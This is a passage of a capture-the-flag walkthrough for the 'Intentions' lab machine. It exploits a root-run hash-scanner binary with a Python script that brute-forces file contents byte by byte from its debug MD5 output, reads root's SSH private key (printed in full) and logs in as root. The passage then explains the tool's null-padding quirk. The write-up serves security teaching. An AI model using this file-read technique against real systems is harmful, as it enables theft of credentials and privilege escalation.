greg@intentions:~$ /opt/scanner/scanner 
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
        Please avoid using extra colons in the label as that is not currently supported.

        Expected output:
        1. Empty if no matches found
        2. A line for every match, example:
                [+] {LABEL} matches {FILE}
  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h

```

It is able to MD5 hash files and compare them against a give list of hashes. It in fact does not work like it says it does, but the broken part is just the full file hash (I’ll play with that in [Beyond Root](#beyond-root)).

It also has the ability to hash only the first X characters of a file. `-p` will be useful because it will print the calculated hash of the file or portion of the file.

So for example:

```

greg@intentions:~$ /opt/scanner/scanner -c user.txt -p -l 5 -s whatever
[DEBUG] user.txt has hash 27334757be8cee7cc16219de94ded2a1
greg@intentions:~$ echo -n "11a99" | md5sum
27334757be8cee7cc16219de94ded2a1  -

```

Here I’m calling `scanner` with:
- `-c user.txt` - target `user.txt`
- `-p` - print debug
- `-l 5` - only consider the first 5 characters
- `-s whatever` - alert if the result matches “whatever”, which will never succeed, but that’s ok

The debug message prints the hash, which matches the MD5 of the first five characters of the file.

### Arbitrary File Read

If I can get the hash of the first byte of a file, then I can brute force all possible bytes and take their hashes and compare to get a match. Then I can do the same with the first two bytes, first three bytes, etc, until I have the full file.

This is more of a programming exercise than anything else. In [this video](https://www.youtube.com/watch?v=IkUmlFklWEs) I’ll walk through creating a Python script to abuse this binary to get file read:

The final script is:

```

#!/usr/bin/env python3

import hashlib
import subprocess
import sys

def get_hash(fn, n):
    """Get the target hash for n length characters of 
    filename fn"""
    proc = subprocess.run(f"/opt/scanner/scanner -c {fn} -s whatever -p -l {n}".split(),
                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        return proc.stdout.decode().strip().split()[-1]
    except IndexError:
        return None

def get_next_char(output, target):
    """Take the current output and figure out what the
    next character will be given the target hash"""
    for i in range(256):
        if target == hashlib.md5(output + chr(i).encode()).hexdigest():
            return chr(i).encode()

output = b""
fn = sys.argv[1]

while True:
    target = get_hash(fn, len(output) + 1)
    next_char = get_next_char(output, target)
    if next_char is None:
        break
    output += next_char
    print(next_char.decode(), end="")

```

With that I can read the root flag, but also root’s private SSH key:

```

greg@intentions:~$ python3 read_file.py /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA5yMuiPaWPr6P0GYiUi5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8JW3
HqEMYrWSNpX2HqbvxnhOBCW/uwKMbFb4LPI+EzR6eHr5vG438EoeGmLFBvhge54WkTvQyd
vk6xqxjypi3PivKnI2Gm+BWzcMi6kHI+NLDUVn7aNthBIg9OyIVwp7LXl3cgUrWM4StvYZ
ZyGpITFR/1KjaCQjLDnshZO7OrM/PLWdyipq2yZtNoB57kvzbPRpXu7ANbM8wV3cyk/OZt
0LZdhfMuJsJsFLhZufADwPVRK1B0oMjcnljhUuVvYJtm8Ig/8fC9ZEcycF69E+nBAiDuUm
kDAhdj0ilD63EbLof4rQmBuYUQPy/KMUwGujCUBQKw3bXdOMs/jq6n8bK7ERcHIEx6uTdw
gE6WlJQhgAp6hT7CiINq34Z2CFd9t2x1o24+JOAQj9JCubRa1fOMFs8OqEBiGQHmOIjmUj
7x17Ygwfhs4O8AQDvjhizWop/7Njg7Xm7ouxzoXdAAAFiJKKGvOSihrzAAAAB3NzaC1yc2
EAAAGBAOcjLoj2lj6+j9BmIlIuRJ6g/EDjPQe4JtpUx8JQOxTMPef8MvCVtx6hDGK1kjaV
9h6m78Z4TgQlv7sCjGxW+CzyPhM0enh6+bxuN/BKHhpixQb4YHueFpE70Mnb5OsasY8qYt
z4rypyNhpvgVs3DIupByPjSw1FZ+2jbYQSIPTsiFcKey15d3IFK1jOErb2GWchqSExUf9S
o2gkIyw57IWTuzqzPzy1ncoqatsmbTaAee5L82z0aV7uwDWzPMFd3MpPzmbdC2XYXzLibC
bBS4WbnwA8D1UStQdKDI3J5Y4VLlb2CbZvCIP/HwvWRHMnBevRPpwQIg7lJpAwIXY9IpQ+
txGy6H+K0JgbmFED8vyjFMBrowlAUCsN213TjLP46up/GyuxEXByBMerk3cIBOlpSUIYAK
eoU+woiDat+GdghXfbdsdaNuPiTgEI/SQrm0WtXzjBbPDqhAYhkB5jiI5lI+8de2IMH4bO
DvAEA744Ys1qKf+zY4O15u6Lsc6F3QAAAAMBAAEAAAGABGD0S8gMhE97LUn3pC7RtUXPky
tRSuqx1VWHu9yyvdWS5g8iToOVLQ/RsP+hFga+jqNmRZBRlz6foWHIByTMcOeKH8/qjD4O
9wM8ho4U5pzD5q2nM3hR4G1g0Q4o8EyrzygQ27OCkZwi/idQhnz/8EsvtWRj/D8G6ME9lo
pHlKdz4fg/tj0UmcGgA4yF3YopSyM5XCv3xac+YFjwHKSgegHyNe3se9BlMJqfz+gfgTz3
8l9LrLiVoKS6JsCvEDe6HGSvyyG9eCg1mQ6J9EkaN2q0uKN35T5siVinK9FtvkNGbCEzFC
PknyAdy792vSIuJrmdKhvRTEUwvntZGXrKtwnf81SX/ZMDRJYqgCQyf5vnUtjKznvohz2R
0i4lakvtXQYC/NNc1QccjTL2NID4nSOhLH2wYzZhKku1vlRmK13HP5BRS0Jus8ScVaYaIS
bEDknHVWHFWndkuQSG2EX9a2auy7oTVCSu7bUXFnottatOxo1atrasNOWcaNkRgdehAAAA
wQDUQfNZuVgdYWS0iJYoyXUNSJAmzFBGxAv3EpKMliTlb/LJlKSCTTttuN7NLHpNWpn92S
pNDghhIYENKoOUUXBgb26gtg1qwzZQGsYy8JLLwgA7g4RF3VD2lGCT377lMD9xv3bhYHPl
lo0L7jaj6PiWKD8Aw0StANo4vOv9bS6cjEUyTl8QM05zTiaFk/UoG3LxoIDT6Vi8wY7hIB
AhDZ6Tm44Mf+XRnBM7AmZqsYh8nw++rhFdr9d39pYaFgok9DcAAADBAO1D0v0/2a2XO4DT
AZdPSERYVIF2W5TH1Atdr37g7i7zrWZxltO5rrAt6DJ79W2laZ9B1Kus1EiXNYkVUZIarx
Yc6Mr5lQ1CSpl0a+OwyJK3Rnh5VZmJQvK0sicM9MyFWGfy7cXCKEFZuinhS4DPBCRSpNBa
zv25Fap0Whav4yqU7BsG2S/mokLGkQ9MVyFpbnrVcnNrwDLd2/whZoENYsiKQSWIFlx8Gd
uCNB7UAUZ7mYFdcDBAJ6uQvPFDdphWPQAAAMEA+WN+VN/TVcfYSYCFiSezNN2xAXCBkkQZ
X7kpdtTupr+gYhL6gv/A5mCOSvv1BLgEl0A05BeWiv7FOkNX5BMR94/NWOlS1Z3T0p+mbj
D7F0nauYkSG+eLwFAd9K/kcdxTuUlwvmPvQiNg70Z142bt1tKN8b3WbttB3sGq39jder8p
nhPKs4TzMzb0gvZGGVZyjqX68coFz3k1nAb5hRS5Q+P6y/XxmdBB4TEHqSQtQ4PoqDj2IP
DVJTokldQ0d4ghAAAAD3Jvb3RAaW50ZW50aW9ucwECAw==
-----END OPENSSH PRIVATE KEY-----

```

### SSH

With that SSH key, I can SSH into the box as root:

```

oxdf@hacky$ ssh -i ~/keys/intentions-root root@10.10.11.220
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)
...[snip]...
root@intentions:~# 

```

And grab `root.txt`:

```

root@intentions:~# cat root.txt
4ee6a2b1************************

```

## Beyond Root

### Inspiration / Weird Behavior

#### Initial Checks

The first thing I did when seeing the `scanner` application was to run it against a file I had access to and run `md5sum` on that same file, expecting the output hashes to match. When they didn’t, I was very confused:

```

greg@intentions:~$ /opt/scanner/scanner -c user.txt -p -s s
[DEBUG] user.txt has hash 582fe8243c33a457d38b9922c7db4c39
greg@intentions:~$ md5sum user.txt
d5f3acbb************************
user.txt

```

This is true for other files as well:

```

greg@intentions:~$ /opt/scanner/scanner -c dmca_hashes.test -p -s s
[DEBUG] dmca_hashes.test has hash 03ae750b60605167d07f8e1f3cefde7c
greg@intentions:~$ md5sum dmca_hashes.test 
a129e4ddc1891a62e15d435256101ea0  dmca_hashes.test

```

#### Help Message

I did a lot of playing around with this before realizing what the issue was. Looking back at the help message, it’s actually in there:

> -l int
> Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)

By default, it only scans 500 bytes of a file. This limit is pretty dumb, and makes it realistically unusable.

### Explaining

#### Files More Than 500 Bytes

With the help menu, at least I know can understand one of the use cases above:

```

greg@intentions:~$ /opt/scanner/scanner -c dmca_hashes.test -p -s s
[DEBUG] dmca_hashes.test has hash 03ae750b60605167d07f8e1f3cefde7c
greg@intentions:~$ /opt/scanner/scanner -c dmca_hashes.test -p -s s -l 500
[DEBUG] dmca_hashes.test has hash 03ae750b60605167d07f8e1f3cefde7c

```

The hash is the same with `-l 500` and without it.

In fact, I can use `dd` to get the first 500 bytes of the file and hash it:

```

greg@intentions:~$ dd if=dmca_hashes.test bs=1 count=500 2>/dev/null | md5sum
03ae750b60605167d07f8e1f3cefde7c  -

```

It matched. All good so far.

#### Files Less Than 500 Bytes

So what about `user.txt`? That’s only 33 bytes:

```

greg@intentions:~$ wc -c user.txt 
33 user.txt

```

What happens when I try to hash that? I can try using `dd` (though I’m not 100% sure what that would do), but it doesn’t match:

```

greg@intentions:~$ dd if=user.txt bs=1 count=500 2>/dev/null | md5sum
d5f3acbbd3dd4dc270b074ee35e1a829  -
greg@intentions:~$ /opt/scanner/scanner -c user.txt -p -s s
[DEBUG] user.txt has hash 582fe8243c33a457d38b9922c7db4c39

```

A hint comes from when I read the flag file writing my script in the [video](https://www.youtube.com/watch?v=IkUmlFklWEs) above:

![image-20230917163720850](/img/image-20230917163720850.png)

It seems that as I’m brute forcing bytes in the file, when I read the end, rather than stopping, it “finds” nulls for “a while”.

I’ll write a script to test this out:

```

#!/usr/bin/env python3

import hashlib
import sys

target = "582fe8243c33a457d38b9922c7db4c39"

string = "11a99958284aa4db60f48c195476af34\n"

while hashlib.md5(string.encode()).hexdigest() != target:
    string += "\x00"

print(len(string))

```

I have the target hash of “582fe8243c33a457d38b9922c7db4c39”. I’ll start with the first known 33 bytes, and then just append nulls until it matches. It instantly prints 500:

```

greg@intentions:~$ python3 brute_nulls.py 
500

```

Before I had seen the “(default 500)” in the help menu, this felt like a huge discovery. Now it just makes perfect sense.

My best theory is that the program creates an `-l` size buffer, and then reads up to that many bytes into it. If that’s the case, the buffer could be nulled beforehand, or it could just happen to have nulls in it most of the time.